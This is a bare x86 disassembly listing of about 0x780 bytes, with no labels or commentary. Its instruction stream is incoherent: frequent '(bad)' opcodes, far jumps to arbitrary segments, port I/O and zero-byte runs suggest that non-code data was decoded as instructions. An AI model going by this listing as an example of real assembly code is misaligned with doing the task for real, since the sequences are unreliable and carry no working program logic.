  41a832:	mov    dh,0x5d
  41a834:	(bad)  
  41a835:	cli    
  41a836:	and    al,0x89
  41a838:	ret    
  41a839:	mov    cl,0x41
  41a83b:	or     al,0x9
  41a83d:	mov    dh,0x47
  41a83f:	fisttp QWORD PTR [eax]
  41a841:	mov    dh,0x4f
  41a843:	fidivr WORD PTR [esi-0x4118f724]
  41a849:	jl     0x41a8ca
  41a84b:	iret   
  41a84c:	dec    esp
  41a84d:	test   DWORD PTR [ebp-0x58],eax
  41a850:	or     BYTE PTR [ecx-0x236b],al
  41a856:	and    BYTE PTR [ecx-0x33bc1edd],0xff
  41a85d:	or     al,BYTE PTR [ecx+ebx*1-0x5c000002]
  41a864:	mov    cl,0x43
  41a866:	add    al,0x27
  41a868:	dec    eax
  41a869:	ins    BYTE PTR es:[edi],dx
  41a86a:	mov    DWORD PTR [ecx-0x66],ecx
  41a86d:	xchg   DWORD PTR [esi-0x50],eax
  41a870:	xchg   BYTE PTR [ecx-0x60],al
  41a873:	pop    es
  41a874:	inc    eax
  41a875:	push   0x4985442b
  41a87a:	test   al,0x75
  41a87c:	pusha  
  41a87d:	inc    edi
  41a87e:	or     BYTE PTR [esi+0x428b21],bl
  41a884:	add    BYTE PTR [eax],al
  41a886:	add    BYTE PTR [eax],al
  41a888:	adc    DWORD PTR [edx+0x47],esi
  41a88b:	lods   al,BYTE PTR ds:[esi]
  41a88c:	out    dx,al
  41a88d:	das    
  41a88e:	sub    eax,0x41736ac8
  41a893:	add    esi,DWORD PTR [ecx+ecx*2]
  41a896:	or     al,0x87
  41a898:	mov    eax,0xb2b60959
  41a89d:	fisttp DWORD PTR ds:0x49536abf
  41a8a3:	or     ah,bh
  41a8a5:	popf   
  41a8a6:	ror    BYTE PTR [ebx+eiz*8],0xa3
  41a8aa:	add    DWORD PTR [edi-0x40f20eeb],edi
  41a8b0:	in     al,dx
  41a8b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8b2:	mov    esp,0x9bd9b888
  41a8b7:	sub    BYTE PTR [edi],dh
  41a8b9:	mov    edx,0x8db886f8
  41a8be:	lea    eax,[ebp+0xe8f1]
  41a8c4:	cld    
  41a8c5:	sbb    eax,0x60f388bc
  41a8ca:	add    DWORD PTR [eax],eax
  41a8cc:	jne    0x41a934
  41a8ce:	dec    eax
  41a8cf:	cwde   
  41a8d0:	mov    dl,0x25
  41a8d2:	pushf  
  41a8d3:	(bad)  
  41a8d4:	shr    al,cl
  41a8d6:	add    BYTE PTR [edi+0x12fa5d30],al
  41a8dc:	mov    DWORD PTR [esi+0x45],edi
  41a8df:	add    al,dh
  41a8e1:	test   al,0x9
  41a8e3:	lea    edx,[eax]
  41a8e5:	fild   WORD PTR [eax]
  41a8e7:	add    BYTE PTR [edx+0x71],bh
  41a8ea:	out    dx,eax
  41a8eb:	daa    
  41a8ec:	add    BYTE PTR [eax],al
  41a8ee:	add    BYTE PTR [eax],al
  41a8f0:	add    BYTE PTR [ebp-0x17],dh
  41a8f3:	test   esp,eax
  41a8f5:	jae    0x41a955
  41a8f7:	push   edx
  41a8f8:	add    DWORD PTR [edx+0x38870b2b],eax
  41a8fe:	add    dl,BYTE PTR [edi-0x7a]
  41a901:	mov    ebx,DWORD PTR [ebx-0x12]
  41a904:	jg     0x41a899
  41a906:	add    bh,ah
  41a908:	add    esi,esp
  41a90a:	jmp    0x41a8d1
  41a90c:	or     dh,cl
  41a90e:	loop   0x41a8f7
  41a910:	add    esi,DWORD PTR [ebp-0x7b]
  41a913:	aas    
  41a914:	pop    edi
  41a915:	loope  0x41a964
  41a917:	push   0xfffffffc
  41a919:	xlat   BYTE PTR ds:[ebx]
  41a91a:	jbe    0x41a8b1
  41a91c:	xchg   BYTE PTR [ebx+0x5b],al
  41a91f:	pushf  
  41a920:	pshufw mm7,QWORD PTR [eax-0x4797fb5b],0xa5
  41a928:	add    eax,0xedee2f2
  41a92d:	jmp    0xe703:0xf4ebff05
  41a934:	add    ebp,esp
  41a936:	inc    edi
  41a937:	retf   
  41a938:	inc    ebx
  41a939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a93a:	pop    esp
  41a93b:	call   0x5c331ead
  41a940:	sbb    al,0xec
  41a942:	mov    ebp,0x1287f934
  41a947:	(bad)  
  41a948:	outs   dx,DWORD PTR ds:[esi]
  41a949:	xor    ecx,0x92dd0c53
  41a94f:	(bad)  
  41a950:	stc    
  41a951:	loope  0x41a8d8
  41a953:	mov    esi,0x3
  41a958:	add    BYTE PTR [eax],al
  41a95a:	push   0x75188c86
  41a95f:	add    ah,BYTE PTR [esp+eax*8+0x46]
  41a963:	std    
  41a964:	jecxz  0x41a97f
  41a966:	shl    ecx,0x9d
  41a969:	or     esi,esi
  41a96b:	cmp    BYTE PTR [esi+0xc057503],0x10
  41a972:	xchg   edx,eax
  41a973:	inc    edi
  41a974:	call   0x35431e7c
  41a979:	inc    ecx
  41a97a:	jno    0x41a97d
  41a97c:	add    BYTE PTR [edi],bh
  41a97e:	and    al,0x5
  41a980:	mov    edi,0xc1fb7989
  41a985:	jmp    0xfd03:0xf9432ab6
  41a98c:	mov    BYTE PTR [edi+0x6b3b837a],bh
  41a992:	jno    0x41a993
  41a994:	mov    ah,BYTE PTR [esi+0x7b]
  41a997:	add    al,BYTE PTR [eax]
  41a999:	push   0xffffffba
  41a99b:	idiv   bh
  41a99d:	imul   ecx,DWORD PTR [esi+0x64],0xf173640d
  41a9a4:	cld    
  41a9a5:	jmp    0x6a69e89b
  41a9aa:	call   0x7d82:0x31380016
  41a9b1:	leave  
  41a9b2:	jbe    0x41a93d
  41a9b4:	inc    edx
  41a9b5:	stc    
  41a9b6:	out    dx,eax
  41a9b7:	cmp    ebp,esp
  41a9b9:	jg     0x41aa0b
  41a9bb:	push   DWORD PTR [ebp+0xe8]
  41a9c1:	add    BYTE PTR [eax],al
  41a9c3:	jge    0x41a97d
  41a9c5:	dec    esi
  41a9c6:	call   0xf2497b02
  41a9cb:	cmp    BYTE PTR [edx],ch
  41a9cd:	inc    ebx
  41a9ce:	(bad)  [edx-0x6ad8feff]
  41a9d4:	out    dx,eax
  41a9d5:	inc    edx
  41a9d6:	cmc    
  41a9d7:	stc    
  41a9d8:	inc    ebx
  41a9d9:	adc    al,0x70
  41a9db:	cmp    ebx,esi
  41a9dd:	cmp    BYTE PTR [edi],ah
  41a9df:	xchg   ecx,eax
  41a9e0:	outs   dx,BYTE PTR ds:[esi]
  41a9e1:	fisub  WORD PTR [edx-0x6d]
  41a9e4:	push   ss
  41a9e5:	cmp    DWORD PTR [edi],esp
  41a9e7:	xchg   ecx,eax
  41a9e8:	dec    DWORD PTR [edx+0x27666]
  41a9ee:	jb     0x41aa6b
  41a9f0:	fiadd  WORD PTR [esi+0x4629a92c]
  41a9f6:	shl    DWORD PTR [esi+edi*1],0x89
  41a9fa:	add    BYTE PTR [ecx-0xa],dl
  41a9fd:	daa    
  41a9fe:	inc    esi
  41a9ff:	mov    al,0x7b
  41aa01:	inc    ecx
  41aa02:	lock pop ds
  41aa04:	(bad)  
  41aa07:	pop    ss
  41aa08:	xor    ah,ch
  41aa0a:	or     DWORD PTR [edi+eax*1+0x50],0xffffffff
  41aa0f:	and    DWORD PTR [esi+edx*1+0x40],0x85554d5c
  41aa17:	pushf  
  41aa18:	pusha  
  41aa19:	sub    al,0x8b
  41aa1b:	sub    esp,esi
  41aa1d:	or     esi,DWORD PTR [esi+0x51b5fb4d]
  41aa23:	pop    ebp
  41aa24:	(bad)
  41aa27:	add    BYTE PTR [eax],al
  41aa29:	add    BYTE PTR [eax],al
  41aa2b:	add    BYTE PTR [edi-0x3a],dl
  41aa2e:	(bad)  
  41aa2f:	mov    edi,0x7d103157
  41aa34:	dec    ecx
  41aa35:	jg     0x41aa89
  41aa37:	or     al,0x9f
  41aa39:	aaa    
  41aa3a:	add    BYTE PTR [eax],0x4b
  41aa3d:	mov    ebp,edi
  41aa3f:	add    DWORD PTR [esp+eax*1],ecx
  41aa42:	jg     0x41aaa9
  41aa44:	and    BYTE PTR ds:0x73344e37,al
  41aa4a:	mov    ah,0x8b
  41aa4c:	shl    edi,1
  41aa4e:	sti    
  41aa4f:	inc    ebp
  41aa50:	add    BYTE PTR [edi+0x41],bh
  41aa53:	lock xchg DWORD PTR [ecx+0x14],eax
  41aa57:	cmp    esp,DWORD PTR [edx+0x57577926]
  41aa5d:	inc    ecx
  41aa5e:	in     al,dx
  41aa5f:	or     DWORD PTR [eax*1+0x7ba84585],0x41
  41aa67:	lock fild QWORD PTR ds:0xf6918924
  41aa6e:	jg     0x41aa30
  41aa70:	into   
  41aa71:	push   ebx
  41aa72:	sti    
  41aa73:	jne    0x41aa5d
  41aa75:	not    DWORD PTR [ecx]
  41aa77:	pusha  
  41aa78:	jne    0x41aa69
  41aa7a:	inc    eax
  41aa7b:	add    BYTE PTR [edx+esi*1+0x7f],cl
  41aa7f:	mov    edi,0x4a89ab28
  41aa84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa85:	loopne 0x41aa31
  41aa87:	inc    BYTE PTR [ebx-0x4a00b4d1]
  41aa8d:	jns    0x41aa9a
  41aa8f:	or     DWORD PTR [eax],eax
  41aa91:	add    BYTE PTR [eax],al
  41aa93:	add    BYTE PTR [eax],al
  41aa95:	mov    ah,0xdc
  41aa97:	sar    BYTE PTR [eax],0x30
  41aa9a:	jmp    0xa73fb616
  41aa9f:	add    al,0x81
  41aaa1:	test   eax,0xf00d045a
  41aaa6:	add    eax,DWORD PTR [bx+si]
  41aaa9:	jne    0x41ab07
  41aaab:	pop    edi
  41aaac:	hlt    
  41aaad:	jne    0x41aae7
  41aaaf:	aas    
  41aab0:	adc    al,0xfe
  41aab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aab3:	or     al,0x39
  41aab5:	mov    ebx,0x6ab274b9
  41aaba:	push   edi
  41aabb:	cmp    eax,0x454f83ff
  41aac0:	add    dh,BYTE PTR [ecx+edi*8]
  41aac3:	or     ecx,DWORD PTR [ecx]
  41aac5:	xor    al,0xdc
  41aac7:	clc    
  41aac8:	sbb    BYTE PTR [eax+0x7c7300f5],0x59
  41aacf:	xor    eax,0x5a667a54
  41aad4:	add    DWORD PTR [ebp-0x27],esi
  41aad7:	add    esp,0xfc785c76
  41aadd:	push   esi
  41aade:	call   0xd9cafd62
  41aae3:	add    BYTE PTR [ecx+0x5043fd38],cl
  41aae9:	dec    edi
  41aaea:	fcomi  st,st(5)
  41aaec:	jb     0x41ab5f
  41aaee:	fs into 
  41aaf0:	cld    
  41aaf1:	inc    eax
  41aaf2:	ror    DWORD PTR [edx-0x3],1
  41aaf5:	dec    eax
  41aaf6:	add    dh,bh
  41aaf8:	mov    al,BYTE PTR [eax]
  41aafa:	add    BYTE PTR [eax],al
  41aafc:	add    BYTE PTR [eax],al
  41aafe:	lods   eax,DWORD PTR ds:[esi]
  41aaff:	out    dx,al
  41ab00:	adc    ecx,DWORD PTR [eax]
  41ab02:	mov    al,0x74
  41ab04:	fucomip st,st(3)
  41ab06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab07:	in     eax,dx
  41ab08:	(bad)  
  41ab09:	neg    BYTE PTR [ebx+0x7503cce9]
  41ab0f:	jnp    0x41ab65
  41ab11:	(bad)  
  41ab12:	xchg   edx,eax
  41ab13:	out    dx,al
  41ab14:	out    0x80,al
  41ab16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab17:	(bad)  
  41ab18:	bound  esp,QWORD PTR [ebx+eax*4]
  41ab1b:	out    dx,al
  41ab1c:	gs push es
  41ab1e:	ret    
  41ab1f:	inc    esi
  41ab20:	jecxz  0x41ab28
  41ab22:	sub    edi,DWORD PTR [esi]
  41ab24:	in     al,dx
  41ab25:	les    ecx,FWORD PTR [edx-0x5]
  41ab28:	loope  0x41aaee
  41ab2a:	sti    
  41ab2b:	inc    edi
  41ab2c:	aas    
  41ab2d:	cmp    BYTE PTR [eax-0x12],bl
  41ab30:	out    0x3,al
  41ab32:	add    BYTE PTR [esi+0x27504dd],0xf2
  41ab39:	inc    ecx
  41ab3a:	jns    0x41ab39
  41ab3c:	push   0x5
  41ab3e:	cmp    ch,dh
  41ab40:	out    0x82,al
  41ab42:	xchg   edi,eax
  41ab43:	mul    dh
  41ab45:	sub    BYTE PTR [edi-0x9f97a0e],0x72
  41ab4c:	push   es
  41ab4d:	neg    BYTE PTR [ecx]
  41ab4f:	jp     0x41aaf5
  41ab51:	sub    esi,esp
  41ab53:	fild   DWORD PTR [bp+di]
  41ab56:	hlt    
  41ab57:	ins    BYTE PTR es:[edi],dx
  41ab58:	mov    DWORD PTR [ebx],0x76d347fa
  41ab5e:	push   edi
  41ab5f:	std    
  41ab60:	xchg   esp,eax
  41ab61:	or     al,0x0
  41ab63:	add    BYTE PTR [eax],al
  41ab65:	add    BYTE PTR [eax],al
  41ab67:	xor    BYTE PTR [esi+esi*1-0x211bd5fd],0x8
  41ab6f:	scas   eax,DWORD PTR es:[edi]
  41ab70:	sub    DWORD PTR [esp+edi*8],esi
  41ab73:	adc    bp,dx
  41ab76:	cmp    eax,0x2bffed99
  41ab7b:	gs jnp 0x41abc8
  41ab7e:	aad    0xef
  41ab80:	inc    eax
  41ab81:	in     al,dx
  41ab82:	loop   0x41abb4
  41ab84:	and    bh,BYTE PTR [edi+edi*4-0x4]
  41ab88:	inc    eax
  41ab89:	adc    al,0xd2
  41ab8b:	push   0x675c0d22
  41ab90:	out    dx,eax
  41ab91:	cld    
  41ab92:	xchg   ah,ch
  41ab94:	inc    eax
  41ab95:	in     al,dx
  41ab96:	jo     0x41abea
  41ab98:	repnz cmp BYTE PTR [edi],ch
  41ab9b:	pop    ecx
  41ab9c:	je     0x41abe3
  41ab9e:	bound  eax,QWORD PTR [edx-0xe]
  41aba1:	sub    BYTE PTR [edi+0x5942855a],ch
  41aba7:	hlt    
  41aba8:	lods   al,BYTE PTR ds:[esi]
  41aba9:	add    DWORD PTR [ecx+0x6aec3ffd],edi
  41abaf:	cmp    DWORD PTR [ebx],eax
  41abb1:	push   eax
  41abb2:	inc    esi
  41abb3:	push   0x62
  41abb5:	push   ss
  41abb6:	test   eax,0x6c575576
  41abbb:	xor    DWORD PTR [eax+0x25],esi
  41abbe:	bound  edi,QWORD PTR [edx+0x665f0cf2]
  41abc4:	push   DWORD PTR [ebp-0x1e528858]
  41abca:	loope  0x41abcc
  41abcc:	add    BYTE PTR [eax],al
  41abce:	add    BYTE PTR [eax],al
  41abd0:	jge    0x41ab92
  41abd2:	mov    BYTE PTR [edi+0x5],dh
  41abd5:	in     eax,dx
  41abd6:	cld    
  41abd7:	jmp    0xf645ec29
  41abdc:	cs or  al,al
  41abdf:	test   eax,0x74f43fff
  41abe4:	mov    ch,BYTE PTR [ebx]
  41abe6:	dec    esi
  41abe7:	adc    DWORD PTR [eax-0x22db774b],ecx
  41abed:	in     eax,dx
  41abee:	inc    edx
  41abef:	std    
  41abf0:	(bad)  
  41abf1:	aas    
  41abf2:	lock bound esp,QWORD PTR [ebx-0x75ffc6ea]
  41abf9:	or     ecx,DWORD PTR es:[ebp-0x408f9]
  41ac00:	push   edi
  41ac01:	sub    al,0xec
  41ac03:	or     DWORD PTR [ebx+eax*1],0xffffff85
  41ac07:	inc    ebp
  41ac08:	loopne 0x41ac83
  41ac0a:	inc    ecx
  41ac0b:	lock lahf 
  41ac0d:	cs and al,0x89
  41ac10:	pop    ecx
  41ac11:	idiv   BYTE PTR [edi-0x40]
  41ac14:	mov    ss,WORD PTR [eax-0x5]
  41ac17:	jne    0x41ac19
  41ac19:	not    BYTE PTR [ecx]
  41ac1b:	pusha  
  41ac1c:	stos   BYTE PTR es:[edi],al
  41ac1d:	inc    eax
  41ac1e:	add    BYTE PTR [ecx+0x65],bl
  41ac21:	ins    DWORD PTR es:[edi],dx
  41ac22:	mov    ebp,0xfaa3190f
  41ac27:	call   DWORD PTR [ebx]
  41ac29:	jp     0x41ac74
  41ac2b:	lock arpl WORD PTR [esi-0x61acfec3],bx
  41ac32:	add    eax,0xc1
  41ac37:	add    BYTE PTR [eax],al
  41ac39:	lods   eax,DWORD PTR ds:[esi]
  41ac3a:	test   DWORD PTR [esi],0x9085e7c1
  41ac40:	add    BYTE PTR [eax+eax*1+0x27],bl
  41ac44:	inc    ecx
  41ac45:	pop    eax
  41ac46:	(bad)  
  41ac48:	sbb    ecx,DWORD PTR [edi+edi*1+0x5c584585]
  41ac4f:	adc    edi,edi
  41ac51:	fsincos 
  41ac53:	xchg   BYTE PTR [ebp+0x28],al
  41ac56:	sub    eax,DWORD PTR [esi+0x20]
  41ac59:	lock mov dl,0xe5
  41ac5c:	jo     0x41acd0
  41ac5e:	idiv   bl
  41ac60:	(bad)  
  41ac61:	(bad)  
  41ac63:	std    
  41ac64:	call   FWORD PTR [eax+eax*1]
  41ac67:	push   0x3
  41ac69:	in     al,0xd8
  41ac6b:	push   0xfffffffe
  41ac6d:	adc    esi,eax
  41ac6f:	or     esi,DWORD PTR [esi-0x49f4fa65]
  41ac75:	jne    0x41ac9b
  41ac77:	push   es
  41ac78:	mov    edi,0xbefde1d5
  41ac7d:	call   0x28c8ad4f
  41ac82:	test   eax,0xd9f1857a
  41ac87:	add    BYTE PTR [eax],al
  41ac89:	jle    0x41ac9e
  41ac8b:	sbb    BYTE PTR [ecx+ebp*2-0x64],bh
  41ac8f:	dec    ecx
  41ac90:	cmp    BYTE PTR [ecx+ebx*8+0x0],dh
  41ac94:	add    BYTE PTR [esp+eax*2+0x60750003],bl
  41ac9b:	inc    edx
  41ac9c:	or     al,0x0
  41ac9e:	add    BYTE PTR [eax],al
  41aca0:	add    BYTE PTR [eax],al
  41aca2:	mov    ah,0x77
  41aca4:	add    eax,0x7dd52887
  41aca9:	push   ebp
  41acaa:	gs rcl al,0x88
  41acae:	imul   ecx,DWORD PTR [edx+0x7d],0x18726142
  41acb5:	or     dh,bh
  41acb7:	mov    dl,0xfc
  41acb9:	mov    BYTE PTR [esi],bh
  41acbb:	add    BYTE PTR [edx+0x68],al
  41acbe:	in     al,dx
  41acbf:	mov    WORD PTR [eax],ss
  41acc1:	add    al,0xee
  41acc3:	popf   
  41acc4:	lock ss mov eax,0xf58d01c9
  41accb:	fld    DWORD PTR [eax]
  41accd:	add    dh,dh
  41accf:	sbb    BYTE PTR [esi],al
  41acd1:	xchg   DWORD PTR [eax+0x7472dbe9],esi
  41acd7:	fld    DWORD PTR [eax]
  41acd9:	mov    ebx,ebp
  41acdb:	ins    BYTE PTR es:[edi],dx
  41acdc:	add    al,0x0
  41acde:	jne    0x41aca8
  41ace0:	mov    ebx,0x84f41c38
  41ace5:	in     al,0x70
  41ace7:	fld    DWORD PTR [eax]
  41ace9:	aaa    
  41acea:	mov    edx,0x238301dd
  41acef:	mov    esi,0x1ee0000
  41acf4:	idiv   BYTE PTR [eax+eax*1-0x6a]
  41acf8:	out    0x3,al
  41acfa:	jne    0x41ad73
  41acfc:	sub    eax,0xe8e22214
  41ad01:	push   ebx
  41ad02:	fdiv   DWORD PTR [edx-0xd]
  41ad05:	repnz add BYTE PTR [eax],al
  41ad08:	add    BYTE PTR [eax],al
  41ad0a:	add    BYTE PTR [eax-0x2],cl
  41ad0d:	mov    ebp,0x27142518
  41ad12:	add    al,0xec
  41ad14:	inc    edx
  41ad15:	sar    DWORD PTR [esi+0x39],cl
  41ad18:	cli    
  41ad19:	outs   dx,DWORD PTR ds:[esi]
  41ad1a:	dec    eax
  41ad1b:	test   DWORD PTR [edi+0x23],esi
  41ad1e:	fdivr  st(5),st
  41ad20:	(bad)
  41ad23:	aaa    
  41ad24:	or     al,BYTE PTR [eax-0x7a1563cc]
  41ad2a:	add    cl,bl
  41ad2c:	inc    edx
  41ad2d:	call   0x6a4be4ae
  41ad32:	retf   0xd974
  41ad35:	enter  0x79ee,0xea
  41ad39:	jno    0x41ad83
  41ad3b:	cdq    
  41ad3c:	inc    edx
  41ad3d:	mov    bh,0x5d
  41ad3f:	jne    0x41ad9d
  41ad41:	out    0xf2,eax
  41ad43:	out    0xa,eax
  41ad45:	pop    esp
  41ad46:	pop    edx
  41ad47:	je     0x41ad99
  41ad49:	inc    esi
  41ad4a:	js     0x41adb1
  41ad4c:	jge    0x41ad7f
  41ad4e:	repnz (bad) 
  41ad50:	div    BYTE PTR ds:0x29da6d78
  41ad56:	in     eax,dx
  41ad57:	cmp    edx,ebp
  41ad59:	imul   ebp,ebx,0x30cb7633
  41ad5f:	and    dh,0x15
  41ad62:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad64:	pop    ds
  41ad65:	fs ret 
  41ad67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad68:	std    
  41ad69:	ret    
  41ad6a:	adc    DWORD PTR [ecx],edx
  41ad6c:	jmp    0x0:0x1fd
  41ad73:	add    dh,dh
  41ad75:	mov    dl,0xff
  41ad77:	int3   
  41ad78:	jbe    0x41ad7c
  41ad7a:	or     eax,0xde9af37
  41ad7f:	lahf   
  41ad80:	xor    al,0x4
  41ad82:	mov    edi,0xbefae9c9
  41ad87:	jmp    0x995d:0x353d69ce
  41ad8e:	call   0x7080ff82
  41ad93:	jo     0x41adc7
  41ad95:	cli    
  41ad96:	jg     0x41ad8e
  41ad98:	sub    esi,edi
  41ad9a:	xor    DWORD PTR [ebp+eiz*2+0x3a9f0002],0x22
  41ada2:	(bad)  
  41ada3:	in     eax,dx
  41ada4:	rep ins BYTE PTR es:[edi],dx
  41ada6:	sbb    ebp,ecx
  41ada8:	jbe    0x41ada1
  41adaa:	mov    ch,0x26
  41adac:	jbe    0x41ada5
  41adae:	mov    ch,0x36
  41adb0:	jnp    0x41ad5b
  41adb2:	fcomip st,st(1)
  41adb4:	mov    DWORD PTR [eax+0x26f97100],ebp
  41adba:	push   esp
  41adbb:	cmc    
  41adbc:	call   0x2:0x7969857a
  41adc3:	push   0x3c
  41adc5:	add    al,BYTE PTR [edi-0x6f1e7954]
  41adcb:	push   ebx
  41adcc:	fs out 0x88,al
  41adcf:	lods   al,BYTE PTR ds:[esi]
  41add0:	call   0x5c:0x76d35042
  41add7:	add    BYTE PTR ss:[eax],al
  41adda:	add    BYTE PTR [eax],al
  41addc:	add    dl,cl
  41adde:	or     cl,BYTE PTR [ebx-0x2af8e6a]
  41ade4:	pushf  
  41ade5:	xchg   BYTE PTR [ebx-0x38],bh
  41ade8:	push   ds
  41ade9:	mov    ds:0x1e9cfcf6,al
  41adee:	loope  0x41ae23
  41adf0:	adc    esp,DWORD PTR [esi+eiz*8]
  41adf3:	add    BYTE PTR [eax],0x74
  41adf6:	add    eax,0x12a9840b
  41adfb:	add    BYTE PTR [eax],al
  41adfd:	leave  
  41adfe:	sti    
  41adff:	sti    
  41ae00:	dec    DWORD PTR [ebx]
  41ae02:	add    al,BYTE PTR [edx+edx*4+0x3cfffe78]
  41ae09:	call   0x4141a9e6
  41ae0e:	das    
  41ae0f:	cmp    DWORD PTR [ebx],ebx
  41ae11:	test   al,0xf1
  41ae13:	sti    
  41ae14:	je     0x41ae7e
  41ae16:	sbb    DWORD PTR [edx],ebx
  41ae18:	cld    
  41ae19:	or     esi,edx
  41ae1b:	jo     0x41ae42
  41ae1d:	push   ecx
  41ae1e:	lds    esi,FWORD PTR [eax+0xb]
  41ae21:	leave  
  41ae22:	adc    bh,ah
  41ae24:	(bad)  
  41ae25:	fild   DWORD PTR [ecx]
  41ae27:	add    DWORD PTR [eax+esi*4],0x420f0004
  41ae2e:	cmp    bh,ch
  41ae30:	push   cs
  41ae31:	inc    edx
  41ae32:	inc    edx
  41ae33:	add    al,cl
  41ae35:	cld    
  41ae36:	in     al,dx
  41ae37:	pop    es
  41ae38:	rcr    DWORD PTR [edi+0x603f7cdc],0x6a
  41ae3f:	xchg   esp,eax
  41ae40:	jmp    0x41ae42
  41ae42:	add    BYTE PTR [eax],al
  41ae44:	add    BYTE PTR [eax],al
  41ae46:	mov    al,ds:0x5d47b601
  41ae4b:	add    esi,DWORD PTR [esi-0x233aa1b1]
  41ae51:	or     BYTE PTR [edi-0x3b],dl
  41ae54:	push   edi
  41ae56:	int3   
  41ae57:	xor    dl,BYTE PTR [esp+esi*2-0x58]
  41ae5b:	jmp    0x39ecea1
  41ae60:	or     esp,0x83000428
  41ae66:	xchg   ebx,eax
  41ae67:	(bad)  
  41ae68:	in     al,0xff
  41ae6a:	push   ebp
  41ae6b:	repnz sti 
  41ae6d:	cmpps  xmm7,XMMWORD PTR [edx],0xfd
  41ae71:	push   cs
  41ae72:	jne    0x41aebb
  41ae74:	inc    eax
  41ae75:	add    dh,BYTE PTR [edx+edi*8]
  41ae78:	clc    
  41ae79:	or     BYTE PTR [edx*8-0x6e54c738],dh
  41ae80:	inc    DWORD PTR [ecx+0xcd5f]
  41ae86:	ds ja  0x41aef1
  41ae89:	jno    0x41ae59
  41ae8b:	jb     0x41aedb
  41ae8d:	js     0x41ae6d
  41ae8f:	scas   eax,DWORD PTR es:[edi]
  41ae90:	cmp    BYTE PTR [edx],0xa9
  41ae93:	mov    dh,0x40
  41ae95:	add    BYTE PTR [ebp-0x38],dh
  41ae98:	test   BYTE PTR [ecx+0xd00d975],bl
  41ae9e:	add    esp,DWORD PTR [ecx]
  41aea0:	add    ecx,DWORD PTR [ecx-0x7d84c2cd]
  41aea6:	dec    ecx
  41aea7:	cwde   
  41aea8:	in     al,dx
  41aea9:	cld    
  41aeaa:	add    BYTE PTR [eax],al
  41aeac:	add    BYTE PTR [eax],al
  41aeae:	add    dh,bh
  41aeb0:	pop    ss
  41aeb1:	add    BYTE PTR [edi-0x312f610],al
  41aeb7:	mov    ds:0x4e684664,al
  41aebc:	mov    eax,ds:0x800d8a7a
  41aec1:	in     al,dx
  41aec2:	cld    
  41aec3:	(bad)  
  41aec4:	push   ss
  41aec5:	cld    
  41aec6:	sub    BYTE PTR [ebp+0x7a738762],ch
  41aecc:	pop    eax
  41aecd:	in     eax,dx
  41aece:	xchg   BYTE PTR [eax],al
  41aed0:	fucomp st(5)
  41aed2:	cld    
  41aed3:	push   0x74
  41aed5:	mov    ecx,0xb2e02d28
  41aeda:	inc    esp
  41aedb:	ja     0x41aef7
  41aedd:	in     al,0x7
  41aedf:	cld    
  41aee0:	lods   eax,DWORD PTR ds:[esi]
  41aee1:	or     BYTE PTR [ebx+eax*1],0x98
  41aee5:	add    DWORD PTR [ecx],ecx
  41aee7:	xor    al,0xe0
  41aee9:	mov    dl,0x4c
  41aeeb:	jo     0x41af4f
  41aeed:	inc    edi
  41aeee:	nop
  41aeef:	add    BYTE PTR [edx],0x5d
  41aef2:	inc    edi
  41aef3:	jno    0x41aeb6
  41aef5:	push   es
  41aef6:	cld    
  41aef7:	ins    DWORD PTR es:[edi],dx
  41aef8:	rcr    DWORD PTR [edi+0x49],0x1
  41aefc:	jnp    0x41aea1
  41aefe:	adc    ebp,edx
  41af00:	sbb    ch,BYTE PTR [ecx]
  41af02:	aad    0x2
  41af04:	jns    0x41aea9
  41af06:	xchg   ebp,ebp
  41af08:	jg     0x41af74
  41af0a:	add    al,0x75
  41af0c:	add    ah,BYTE PTR [eax+0x49]
  41af0f:	std    
  41af10:	jp     0x41af7e
  41af12:	mov    eax,DWORD PTR [eax]
  41af14:	add    BYTE PTR [eax],al
  41af16:	add    BYTE PTR [eax],al
  41af18:	jmp    0xd659:0xef80e6e6
  41af1f:	out    dx,al
  41af20:	fnstcw WORD PTR [esi-0x192fa49d]
  41af26:	lds    eax,FWORD PTR [esi*2+0x377ce702]
  41af2d:	jbe    0x41aee4
  41af2f:	sbb    BYTE PTR [ecx-0x9fbd623],al
  41af35:	shl    ebp,0x7e
  41af38:	sar    ch,1
  41af3a:	out    0x3,al
  41af3c:	jo     0x41afb8
  41af3e:	xchg   ebp,eax
  41af3f:	and    DWORD PTR [ebp+0x2],esi
  41af42:	push   0xffffffc6
  41af44:	js     0x41af1f
  41af46:	aam    0xec
  41af48:	mov    esi,esp
  41af4a:	outs   dx,DWORD PTR ds:[esi]
  41af4b:	jo     0x41afb6
  41af4d:	jns    0x41af62
  41af4f:	hlt    
  41af50:	in     eax,dx
  41af51:	cmp    al,0xc3
  41af53:	inc    ebx
  41af54:	lds    ebx,FWORD PTR [eax-0x19]
  41af57:	out    dx,al
  41af58:	out    0x6,eax
  41af5a:	ins    BYTE PTR es:[edi],dx
  41af5b:	push   esi
  41af5c:	je     0x41af43
  41af5e:	fisttp DWORD PTR [ebx]
  41af60:	in     al,dx
  41af61:	mov    ecx,0x12c7eeb4
  41af66:	inc    esi
  41af67:	js     0x41afe2
  41af69:	in     eax,0xb3
  41af6b:	sti    
  41af6c:	pop    edx
  41af6d:	mov    ebx,0xe74b30ff
  41af72:	xor    BYTE PTR [ecx],0x79
  41af75:	outs   dx,BYTE PTR ds:[esi]
  41af76:	and    ebp,DWORD PTR [esi+esi*1+0x72]
  41af7a:	or     esp,ebx
  41af7c:	add    BYTE PTR [eax],al
  41af7e:	add    BYTE PTR [eax],al
  41af80:	add    BYTE PTR [eax-0x1a],dh
  41af83:	cld    
  41af84:	push   ss
  41af85:	sbb    eax,DWORD PTR [ecx+0x276cbbb]
  41af8b:	or     eax,0xde5b33f
  41af90:	aaa    
  41af91:	inc    ebx
  41af92:	add    BYTE PTR [edi-0x410501f7],bh
  41af98:	jmp    0xaf6d:0x3d3d65de
  41af9f:	call   0x70810d8b
  41afa4:	pusha  
  41afa5:	xor    bh,dl
  41afa7:	mov    esi,esp
  41afa9:	mov    ds:0x9af17449,al
  41afae:	dec    esi
  41afaf:	or     eax,0xb7a64
  41afb4:	jmp    0xe8865f72
